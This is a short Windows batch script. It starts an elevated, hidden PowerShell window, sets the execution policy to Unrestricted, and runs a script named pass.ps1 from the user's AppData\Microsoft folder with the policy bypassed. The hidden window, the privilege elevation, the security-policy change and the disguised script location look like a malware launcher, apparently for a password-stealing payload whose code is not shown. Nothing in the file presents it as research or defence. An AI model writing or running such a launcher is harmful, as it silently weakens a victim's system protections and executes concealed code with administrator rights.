@echo off
cd %userprofile%\
powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\pass.ps1' -WindowStyle Hidden -Verb RunAs"


